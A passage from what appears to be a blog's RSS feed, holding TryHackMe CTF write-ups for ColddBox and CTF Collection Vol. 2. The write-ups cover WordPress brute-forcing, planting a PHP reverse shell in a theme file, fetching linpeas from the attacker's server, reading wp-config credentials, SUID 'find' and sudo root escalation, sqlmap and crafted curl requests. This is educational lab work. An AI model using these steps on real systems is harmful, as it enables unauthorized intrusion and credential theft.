        <guid>https://chaudhary1337.github.io/p/tryhackme-coldbox-writeup-all-paths/</guid>
        <description>&lt;img src="https://i.imgur.com/k2cJkVq.png" alt="Featured image of post TryHackMe: ColdBox Writeup (All Paths)" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/colddboxeasy&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing interesting. Only port 80 open, no ssh.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 65530 closed ports
PORT      STATE    SERVICE
80/tcp    open     http
4512/tcp  open     unknown
8584/tcp  filtered unknown
43286/tcp filtered unknown
59766/tcp filtered unknown
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Again, these don&amp;rsquo;t look like they are expected. We may check 4512 later.+&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 32 -q -u 10.10.141.86         
/index.php            (Status: 301) [Size: 0] [--&amp;gt; http://10.10.141.86/]
/wp-content           (Status: 301) [Size: 317] [--&amp;gt; http://10.10.141.86/wp-content/]
/wp-login.php         (Status: 200) [Size: 2547]                                     
/license.txt          (Status: 200) [Size: 19930]                                    
/wp-includes          (Status: 301) [Size: 318] [--&amp;gt; http://10.10.141.86/wp-includes/]
/readme.html          (Status: 200) [Size: 7173]                                      
/wp-trackback.php     (Status: 200) [Size: 135]                                       
/wp-admin             (Status: 301) [Size: 315] [--&amp;gt; http://10.10.141.86/wp-admin/]   
/hidden               (Status: 301) [Size: 313] [--&amp;gt; http://10.10.141.86/hidden/]     
/xmlrpc.php           (Status: 200) [Size: 42]                                        
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note the &lt;code&gt;/hidden/&lt;/code&gt; directory. Rest everything looks standard.&lt;/p&gt;
&lt;p&gt;I tried exploring the &lt;code&gt;wp-trackback&lt;/code&gt;, but it looked like a dead end.&lt;/p&gt;
&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/u4M5YBh.png&#34; alt=&#34;ColddBox homepage&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;The author is mentioned as:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Author: the cold in person&lt;/code&gt;
&lt;img src=&#34;https://i.imgur.com/8fjTVzI.png&#34; alt=&#34;author of the page in coldbox thm page&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;This username is incorrect, as shown by the WordPress error message.
&lt;img src=&#34;https://i.imgur.com/5fZKpzg.png&#34; alt=&#34;wp login error message of invalid username&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;14-hidden-directory&#34;&gt;1.4. Hidden Directory&lt;/h3&gt;
&lt;p&gt;We find a hidden directory in the gobsuter scan.
&lt;img src=&#34;https://i.imgur.com/ZnRS0ih.png&#34; alt=&#34;urgent webpage in the hidden directory&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We thus get a list of the usernames:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;C0ldd&lt;/li&gt;
&lt;li&gt;Hugo&lt;/li&gt;
&lt;li&gt;Philip
Trying them out gives the same error message for all of them. This means we can brute-forcing!
&lt;img src=&#34;https://i.imgur.com/VRC872l.png&#34; alt=&#34;incorrect password error message means we have the correct username&#34;  /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;15-brute-force&#34;&gt;1.5. Brute-Force&lt;/h3&gt;
&lt;p&gt;We use the &lt;code&gt;wpscan&lt;/code&gt; tool.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wpscan --url http://10.10.141.86/ -U c0ldd,philip,hugo -P /usr/share/wordlists/rockyou.txt --password-attack wp-login -t 32&lt;/code&gt; -&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;ndash;url: specifies the url&lt;/li&gt;
&lt;li&gt;-U: specifies the userlist&lt;/li&gt;
&lt;li&gt;-P: specifies the passwordlist&lt;/li&gt;
&lt;li&gt;-t: threads&lt;/li&gt;
&lt;li&gt;&amp;ndash;password-attack: self explanatory&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Wait patiently, this scan took me 12+ minutes. We thus get: &lt;code&gt;[SUCCESS] - c0ldd / {the author yeeted this}&lt;/code&gt;
&lt;img src=&#34;https://i.imgur.com/TflUIH8.png&#34; alt=&#34;cms dashboard page&#34;  /&gt;&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;To get a foothold, I usually edit the 404.php page.
It can be found in: Appearance -&amp;gt; editor -&amp;gt; 404.php&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://imgur.com/ewcF9UW.png&#34; alt=&#34;editing the php 404 page&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;I put the phprevshell. This can be taken from &lt;a class=&#34;link&#34; href=&#34;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;github here&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start a listener on selected port. Listen using &lt;code&gt;nc -lnvp PORT_NUMBER_HERE&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Go to: &lt;code&gt;http://10.10.141.86/?p=2&lt;/code&gt; (only post=1 exists)&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~/Desktop/tools/files]
└─$ nc -lvnp 443  
listening on [any] 443 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.141.86] 54404
Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 06:14:23 up 45 min,  0 users,  load average: 0.30, 12.10, 16.15
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can&#39;t access tty; job control turned off
$ python3 -c &#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&#39;
www-data@ColddBox-Easy:/$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are in!&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;I transferred the &lt;code&gt;linpeas.sh&lt;/code&gt; file, which you can take from &lt;a class=&#34;link&#34; href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Start a python server on your machine, using &lt;code&gt;sudo python3 -m http.server 80&lt;/code&gt; and on the target machine, &lt;code&gt;wget YOUR_IP_ADDRESS/linpeas.sh&lt;/code&gt;. Make sure that you are in a directory with write permisssions. One &lt;em&gt;really&lt;/em&gt; good place is &lt;code&gt;/tmp&lt;/code&gt; direcotry. Execute the file using &lt;code&gt;bash linpeas.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;The following was marked as potential PE vectors.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Operative system                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits            
Linux version 4.4.0-186-generic (buildd@lcy01-amd64-002) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.7 LTS
Release:        16.04
Codename:       xenial
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looks like an old kernel version.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version               
Sudo version 1.8.16   
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This exploit only works in certain conditions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; you know sudo password of &lt;em&gt;any&lt;/em&gt; user&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; the permissions look something like: &lt;code&gt;(ALL, !root) /usr/bin/id&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;[+] SUID - Check easy privesc, exploits and write perms                                    
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid              
-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping6                                
-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping
-rwsr-sr-x 1 daemon daemon      51K Jan 14  2016 /usr/bin/at  ---&amp;gt;  RTru64_UNIX_4.0g(CVE-2002-1614)                                                                                   
-rwsr-xr-x 1 root   root       217K Feb  8  2016 /usr/bin/find

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;/usr/bin/find marked&lt;/code&gt;. We can also find other files with the set-uid bit. Look at the following.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ColddBox-Easy:/tmp$ find / -type f -perm -u=s 2&amp;gt; /dev/null
find / -type f -perm -u=s 2&amp;gt; /dev/null
/bin/su
/bin/ping6
/bin/ping
/bin/fusermount
/bin/umount
/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/find
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;31-suid-bit-find-binary&#34;&gt;3.1. SUID Bit: Find Binary&lt;/h3&gt;
&lt;p&gt;Using &lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/find/#suid&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GTFOBins - Find SUID&lt;/a&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ColddBox-Easy:/tmp$ find . -exec /bin/sh -p \; -quit
find . -exec /bin/sh -p \; -quit
# id    
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this, we can view both the user and root flags in the &lt;code&gt;/home/c0ldd&lt;/code&gt; and the &lt;code&gt;/root&lt;/code&gt; directory.&lt;/p&gt;
&lt;h3 id=&#34;32-exploration--sudo-3-paths&#34;&gt;3.2. Exploration + SUDO: 3 Paths&lt;/h3&gt;
&lt;p&gt;Note how we have the user &lt;code&gt;c0ldd&lt;/code&gt;. Could we try and getting some credentials? From other machines, I know &lt;code&gt;wp-config.php&lt;/code&gt; is a juicy file. Exploring that,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ColddBox-Easy:/var/www/html$ cat wp-config.php
cat wp-config.php
&amp;lt;?php
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, and ABSPATH. You can find more information by visiting
 * {@link http://codex.cms.org/Editing_wp-config.php Editing wp-config.php}
 * Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don&#39;t have to use the web site, you can just copy this file
 * to &amp;quot;wp-config.php&amp;quot; and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define(&#39;DB_NAME&#39;, &#39;colddbox&#39;);

/** MySQL database username */
define(&#39;DB_USER&#39;, &#39;c0ldd&#39;);

/** MySQL database password */
define(&#39;DB_PASSWORD&#39;, &#39;{i ate this, was too tasty}&#39;);

/** MySQL hostname */
define(&#39;DB_HOST&#39;, &#39;localhost&#39;);

{truncated}

define(&#39;WP_HOME&#39;, &#39;/&#39;);
define(&#39;WP_SITEURL&#39;, &#39;/&#39;);

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . &#39;wp-settings.php&#39;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have credentials for &lt;code&gt;c0ldd&lt;/code&gt;!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@ColddBox-Easy:/var/www/html$ su c0ldd
su c0ldd
Password: {i hid this :P}

c0ldd@ColddBox-Easy:/var/www/html$ cd ~
cd ~
c0ldd@ColddBox-Easy:~$ sudo -l
sudo -l
[sudo] password for c0ldd: {yes I ate this too. Don&#39;t judge me ok}

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We see that we are allowed to run the 3 files as sudo. We use the following respectively for each of the binaries.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/vim/#sudo&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GTFOBins - vim SUDO&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/chmod/#sudo&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GTFOBins - chmod SUDO&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/ftp/#sudo&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GTFOBins - ftp SUDO&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This completes our room. System FULLY compromised!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: CTF Collection Vol. 2 Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-ctf-collection-vol.-2-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-ctf-collection-vol.-2-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/nS97pns.png" alt="Featured image of post TryHackMe: CTF Collection Vol. 2 Writeup" /&gt;&lt;p&gt;Challenge home page.
&lt;img src=&#34;https://i.imgur.com/IrNcLcf.png&#34; alt=&#34;Home page of the challenge&#34;  /&gt;&lt;/p&gt;
&lt;h2 id=&#34;0-scanning--enumeration&#34;&gt;0. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;h3 id=&#34;port-scanning&#34;&gt;Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;PORT   STATE    SERVICE VERSION
6/tcp  filtered unknown
22/tcp open     ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 1b:c2:b6:2d:fb:32:cc:11:68:61:ab:31:5b:45:5c:f4 (DSA)
|   2048 8d:88:65:9d:31:ff:b4:62:f9:28:f2:7d:42:07:89:58 (RSA)
|_  256 40:2e:b0:ed:2a:5a:9d:83:6a:6e:59:31:db:09:4c:cb (ECDSA)
80/tcp open     http    Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/VlNCcElFSWdTQ0JKSUVZZ1dTQm5JR1VnYVNCQ0lGUWdTU0JFSUVrZ1p5QldJR2tnUWlCNklFa2dSaUJuSUdjZ1RTQjVJRUlnVHlCSklFY2dkeUJuSUZjZ1V5QkJJSG9nU1NCRklHOGdaeUJpSUVNZ1FpQnJJRWtnUlNCWklHY2dUeUJUSUVJZ2NDQkpJRVlnYXlCbklGY2dReUJDSUU4Z1NTQkhJSGNnUFElM0QlM0Q=
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: 360 No Scope!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I do not know about port 6, but we see some interesting stuff in robots.txt right away.&lt;/p&gt;
&lt;h3 id=&#34;web-enumeration&#34;&gt;Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -u 10.10.9.174 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 32 -q

/login                (Status: 301) [Size: 310] [--&amp;gt; http://10.10.9.174/login/]                   
/index                (Status: 200) [Size: 94328]                              
/index.php            (Status: 200) [Size: 94328]                              
/button               (Status: 200) [Size: 39148]                              
/static               (Status: 200) [Size: 253890]                             
/cat                  (Status: 200) [Size: 62048]                              
/small                (Status: 200) [Size: 689]                                
/who                  (Status: 200) [Size: 3847428]                            
/robots               (Status: 200) [Size: 430]                                
/robots.txt           (Status: 200) [Size: 430]                                
/iphone               (Status: 200) [Size: 19867]                              
/game1                (Status: 301) [Size: 310] [--&amp;gt; http://10.10.9.174/game1/]
/egg                  (Status: 200) [Size: 25557]                              
/dinner               (Status: 200) [Size: 1264533]                            
/ty                   (Status: 200) [Size: 198518]                             
/ready                (Status: 301) [Size: 310] [--&amp;gt; http://10.10.9.174/ready/]
/saw                  (Status: 200) [Size: 156274]                             
/game2                (Status: 301) [Size: 310] [--&amp;gt; http://10.10.9.174/game2/]
/wel                  (Status: 200) [Size: 155758]                             
/free_sub             (Status: 301) [Size: 313] [--&amp;gt; http://10.10.9.174/free_sub/]
/nicole               (Status: 200) [Size: 367650]                                
/server-status        (Status: 403) [Size: 292]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I let this scan run, and explored the tasks one by one - albeit randomly.&lt;/p&gt;
&lt;h3 id=&#34;easter-1&#34;&gt;Easter 1&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/cMUbb8J.png&#34; alt=&#34;robots.txt web page containing two flags&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Shove the hex thingy into &lt;a class=&#34;link&#34; href=&#34;http://icyberchef.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CyberChef&lt;/a&gt;.&lt;/p&gt;
&lt;h3 id=&#34;easter-2&#34;&gt;Easter 2&lt;/h3&gt;
&lt;p&gt;Take the disallowed directory name, and put it as such:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;base64 -&amp;gt; base64 -&amp;gt; remove spaces -&amp;gt; base64 -&amp;gt; remove spaces -&amp;gt; base64&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Feel free to use python3 snippet, &lt;code&gt;&#39;&#39;.join(x.strip().split())&lt;/code&gt;, where x is the string to remove the spaces.&lt;/p&gt;
&lt;p&gt;Go to the directory and view the source code.&lt;/p&gt;
&lt;h3 id=&#34;easter-3&#34;&gt;Easter 3&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;/login/&lt;/code&gt; source code :D&lt;/p&gt;
&lt;h3 id=&#34;easter-4&#34;&gt;Easter 4&lt;/h3&gt;
&lt;p&gt;I used sqlmap to do the attacks automatically.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Database: THM_*****_**
Table: nothing_inside
[1 entry]
+-------------------------+
| Easter_4                |
+-------------------------+
| THM{noice}              |
+-------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;easter-5&#34;&gt;Easter 5&lt;/h3&gt;
&lt;p&gt;Continuing on the previous one, look for the database dump, crack the hash using hashcat. The mode is 0 aka md5sum.&lt;/p&gt;
&lt;h3 id=&#34;easter-6&#34;&gt;Easter 6&lt;/h3&gt;
&lt;p&gt;The hint says &amp;ldquo;Look out for the response header&amp;rdquo;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ curl -i 10.10.9.174 -s | grep -v &amp;quot;Easter 14&amp;quot; | grep -i &amp;quot;easter&amp;quot;
Busted: Hey, you found me, take this Easter 6: THM{yee}
        &amp;lt;!--! Easter 17--&amp;gt;
        &amp;lt;h3&amp;gt; Hey! I got the easter 20 for you. I leave the credential for you to POST (username:DesKel, password:heIsDumb). Please, I beg you. Don&#39;t let him know.&amp;lt;/h3&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here,&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;curl
&lt;ul&gt;
&lt;li&gt;-i gets the response header as well as the complete response&lt;/li&gt;
&lt;li&gt;-s is &lt;strong&gt;S&lt;/strong&gt;ilent mode&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;grep
&lt;ul&gt;
&lt;li&gt;-v to in&lt;strong&gt;V&lt;/strong&gt;ert the search - that is, remove it from the search results&lt;/li&gt;
&lt;li&gt;-i is case &lt;strong&gt;I&lt;/strong&gt;nsensitive search&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;easter-7&#34;&gt;Easter 7&lt;/h3&gt;
&lt;p&gt;Checking the cookies.
&lt;img src=&#34;https://i.imgur.com/YrqubFa.png&#34; alt=&#34;Checking the cookies&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;easter-8&#34;&gt;Easter 8&lt;/h3&gt;
&lt;p&gt;We change our user agent using curl as,&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl -A &amp;quot;Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1&amp;quot; 10.10.9.174 &amp;gt; rich.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Taken from &lt;a class=&#34;link&#34; href=&#34;https://developers.whatismybrowser.com/useragents/parse/5390161safari-ios-iphone-webkit&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat rich.txt | grep &amp;quot;Easter 8&amp;quot;
                        &amp;lt;h4&amp;gt;You are Rich! Subscribe to THM server ^^ now. Oh btw, Easter 8: THM{mmmmm}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;easter-9&#34;&gt;Easter 9&lt;/h3&gt;
&lt;p&gt;This one is closely related to 13. Once you press the button, you are taken to an intermediate page. Read the source code.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/UDKXWzU.png&#34; alt=&#34;Intermediate page source code&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;easter-10&#34;&gt;Easter 10&lt;/h3&gt;
&lt;p&gt;We change the referer to tryhackme.com, without the http:// part.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ curl -H &amp;quot;referer: tryhackme.com&amp;quot; http://10.10.9.174/free_sub/ 
Nah, there are no voucher here, I&#39;m too poor to buy a new one XD. But i got an egg for you. Easter 10: THM{mmmm} 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Recall, &lt;code&gt;-H&lt;/code&gt; is used to specify the header.&lt;/p&gt;
&lt;h3 id=&#34;easter-11&#34;&gt;Easter 11&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/dwGhmdL.png&#34; alt=&#34;main page, dinner menu&#34;  /&gt;
Main page, dinner menu. The hint is to select &lt;code&gt;egg&lt;/code&gt;, but we do not have it as an option. So, we put a request as such:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl --data &amp;quot;dinner=egg&amp;amp;submit=submit&amp;quot; 10.10.9.174 | grep -v &amp;quot;Easter 14&amp;quot; | grep -i &amp;quot;easter&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;--data&lt;/code&gt; is self explanatory. Rest of the flags have been explained above.&lt;/p&gt;
&lt;h3 id=&#34;easter-12&#34;&gt;Easter 12&lt;/h3&gt;
&lt;p&gt;We find a hidden and useless javascript file in the Network tab.
&lt;img src=&#34;https://i.imgur.com/aw6ld7A.jpg&#34; alt=&#34;Hidden useless javascript file&#34;  /&gt;
Go to console and execute the function.&lt;/p&gt;
&lt;h3 id=&#34;easter-13&#34;&gt;Easter 13&lt;/h3&gt;
&lt;p&gt;Destroy the world to get the flag. Press the big button on the home page. Related to 9. Let the redirect happen.&lt;/p&gt;
&lt;h3 id=&#34;easter-14&#34;&gt;Easter 14&lt;/h3&gt;
&lt;p&gt;Viewing the source code of the main page, we get the following comment:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;!--Easter 14&amp;lt;img src=&amp;quot;data:image/png;base64,iVBORw0KGgo ...&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Remove the comment parts and the html tags, and put it in CyberChef. As usual, magic button works its charm.&lt;/p&gt;
&lt;h3 id=&#34;easter-15-game-1&#34;&gt;Easter 15: Game 1&lt;/h3&gt;
&lt;p&gt;This one is a concoction of smart and dumb at the same time. You have to realise that those hashes are just mappings from letters to numbers. Moreover, they are deterministic.&lt;/p&gt;
&lt;p&gt;So, how do you get ALL the possible mappings? Its big brain time (for you. I did it already).&lt;/p&gt;
&lt;p&gt;PS: Feel free to use python3 again :)
PPS: And what does mapping map to, in python lingo?&lt;/p&gt;
&lt;h3 id=&#34;easter-16-game-2&#34;&gt;Easter 16: Game 2&lt;/h3&gt;
&lt;p&gt;This one is very straight forward too, just use curl, and the &lt;code&gt;-F&lt;/code&gt; flag to specify stuff. It stands for field.&lt;/p&gt;
&lt;p&gt;Use the below:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl -X POST http://10.10.9.174/game2/ -F &amp;quot;button3=button3&amp;quot;  -F &amp;quot;button2=button2&amp;quot; -F &amp;quot;button1=button1&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Easy.&lt;/p&gt;
&lt;h3 id=&#34;easter-17&#34;&gt;Easter 17&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;	&amp;lt;script&amp;gt;
	function catz(){
        	document.getElementById(&amp;quot;nyan&amp;quot;).innerHTML = &amp;quot;1000...&amp;quot;
	}
	&amp;lt;/script&amp;gt;
    
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Take the binary and then &amp;hellip;
&lt;code&gt;Binary -&amp;gt; Hex -&amp;gt; Text -&amp;gt; Stonks&lt;/code&gt;.&lt;/p&gt;
&lt;h3 id=&#34;easter-18&#34;&gt;Easter 18&lt;/h3&gt;
&lt;p&gt;The YES to say to the eggs one.
&lt;code&gt;curl -H &amp;quot;egg: YES&amp;quot; 10.10.9.174 | grep &amp;quot;Easter&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Easy :)&lt;/p&gt;
&lt;h3 id=&#34;easter-19&#34;&gt;Easter 19&lt;/h3&gt;
&lt;p&gt;The thick dark line is an image. Check the source code :)&lt;/p&gt;
&lt;h3 id=&#34;easter-20&#34;&gt;Easter 20&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;h3&amp;gt; Hey! I got the easter 20 for you. I leave the credential for you to POST (username:DesKel, password:heIsDumb). Please, I beg you. Don&#39;t let him know.&amp;lt;/h3&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl --data &amp;quot;username=DesKel&amp;amp;password=heIsDumb&amp;quot; -X POST 10.10.9.174 | grep &amp;quot;Easter 20&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And &amp;hellip; we are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Different CTF Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-different-ctf-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-different-ctf-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/uAE0SRq.png" alt="Featured image of post TryHackMe: Different CTF Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/adana&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
